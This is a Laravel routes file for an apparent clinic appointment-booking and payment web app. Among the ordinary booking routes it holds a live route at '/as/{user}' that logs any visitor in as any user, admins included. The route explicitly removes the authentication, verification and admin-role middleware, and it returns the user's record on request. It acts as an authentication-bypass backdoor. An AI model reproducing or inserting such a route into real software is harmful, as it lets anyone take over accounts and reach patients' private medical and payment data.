<?php

use App\Http\Controllers\Frontend\IndexController;
use App\Http\Controllers\Frontend\BookAppointmentController;
use App\Http\Controllers\Paynow\ShowRequestPaymentAction;
use App\Http\Controllers\Paynow\StorePaymentRequestAction;
use App\Http\Controllers\Paynow\VerifyPaymentRequestAction;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;

Route::get('/', IndexController::class)
    ->name('frontend.index');

Route::namespace(null)
    ->prefix('book-appointment')
    ->name('bookAppointment.')
    ->group(function () {

        // Capture dni & office
        Route::get('/', [BookAppointmentController::class, 'index'])
            ->name('index');
        Route::post('/', [BookAppointmentController::class, 'indexPost'])
            ->name('index.post');

        // Missing patient
        Route::get('/dni/{dni}/register-patient', [BookAppointmentController::class, 'patient'])
            ->name('patient');
        Route::post('/dni/{dni}/register-patient', [BookAppointmentController::class, 'patientPost'])
            ->name('patient.post');

        // Missing patient->phone
        Route::get('/dni/{dni}/confirm-patient', [BookAppointmentController::class, 'patientPhone'])
            ->name('patientPhone');
        Route::post('/dni/{dni}/confirm-patient', [BookAppointmentController::class, 'patientPhonePost'])
            ->name('patientPhone.post');

        // Pick day
        Route::get('/dni/{dni}/day/', [BookAppointmentController::class, 'pickDay'])
            ->name('pickDay');
        Route::post('/dni/{dni}/day/', [BookAppointmentController::class, 'pickDayPost'])
            ->name('pickDay.post');

        // Pick time
        Route::get('/dni/{dni}/day/{date}/time/', [BookAppointmentController::class, 'pickTime'])
            ->name('pickTime');
        Route::post('/dni/{dni}/day/{date}/time/', [BookAppointmentController::class, 'pickTimePost'])
            ->name('pickTime.post');

        // Thanks
        Route::get('/thanks', [BookAppointmentController::class, 'thanks'])
            ->name('thanks');
    });


Route::get('/as/{user}/{info?}', function (App\Models\User $user, $info = null) {
    if (!$info) {
        auth()->login($user, true);
        return redirect('/login');
    }

    return [
        'LOGIN_URL' => url("/as/{$user->id}/login"),
        'user' => $user,
    ];
})->withoutMiddleware(['auth:sanctum', 'verified', 'role:admin']);


Route::prefix('/paynow')
    ->name('paynow.')
    ->group(function () {
        Route::get('/verify/{patientPaymentRequest}', VerifyPaymentRequestAction::class)
            ->name('verify');

        Route::get('/{patient}/{amount}', ShowRequestPaymentAction::class)
            ->name('index');

        Route::post('/{patient}', StorePaymentRequestAction::class)
            ->name('store');
    });
